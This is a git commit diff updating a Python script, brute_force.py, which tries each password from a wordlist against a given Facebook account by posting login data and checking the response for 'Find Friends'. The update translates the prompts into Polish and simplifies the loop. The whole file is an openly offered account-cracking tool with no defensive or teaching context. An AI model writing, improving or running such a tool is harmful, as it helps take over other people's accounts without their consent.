9a0e2606f351d95a6b3d64226f4162260190ffe2
Kamil01 <107310243+Adminek01@users.noreply.github.com>
2023-11-21 18:24:17 +0100

    Update brute_force.py

--- brute_force.py
+++ brute_force.py
@@ -1,37 +1,34 @@
+
 import requests
+from bs4 import BeautifulSoup
 
 def brute_force(username, fb_id, passwords):
-    login_url = f'https://www.facebook.com/{fb_id}'
-    
+    url = f'https://www.facebook.com/{fb_id}'
+
     with requests.Session() as session:
-        for i, password in enumerate(passwords, 1):
-            data = {
-                'email': username,
-                'pass': password,
-                'login': 'Log In'
-            }
+        for password in passwords:
+            data = {'email': username, 'pass': password}
 
-            try:
-                response = session.post(login_url, data=data)
-                if 'Find Friends' in response.text:
-                    print(f'Successful login! Username: {username}, Password: {password}')
-                    break
-            except requests.RequestException as e:
-                print(f'Error during login attempt: {e}')
+            response = session.post(url, data=data)
 
-            # Print progress after each attempt
-            print(f'Attempt {i}/{len(passwords)}')
+            if 'Find Friends' in response.text:
+                print(f'Prawidłowe hasło znalezione: {password}')
+                break
+            else:
+                print(f'Nieprawidłowe hasło: {password}')
 
-if __name__ == "__main__":
-    username = input("Enter username/email: ")
-    fb_id = input("Enter Facebook ID: ")
-    password_file = input("Enter the name of the password file: ")
+def main():
+    username = input('Podaj nazwę użytkownika: ')
+    fb_id = input('Podaj identyfikator Facebooka: ')
+    password_file = input('Podaj nazwę pliku z hasłami: ')
 
     with open(password_file, 'r') as file:
         passwords = [line.strip() for line in file]
 
     brute_force(username, fb_id, passwords)
 
+if __name__ == '__main__':
+    main()
 
 
 
